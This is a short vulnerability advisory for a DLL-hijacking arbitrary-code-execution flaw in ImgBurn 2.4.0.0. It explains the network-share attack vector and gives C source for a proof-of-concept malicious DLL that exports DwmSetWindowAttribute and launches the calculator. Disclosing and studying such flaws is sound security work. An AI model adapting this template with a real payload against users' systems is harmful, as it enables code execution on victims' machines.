ImgBurn is prone to an arbitrary-code-execution vulnerability.

An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Link Library (DLL) file.

ImgBurn 2.4.0.0 is vulnerable; other versions may also be affected.

#include <windows.h>
#define DllExport __declspec (dllexport)
DllExport void DwmSetWindowAttribute() { egg(); }

int egg()
{
    system ("calc");
        exit(0);
        return 0;
}
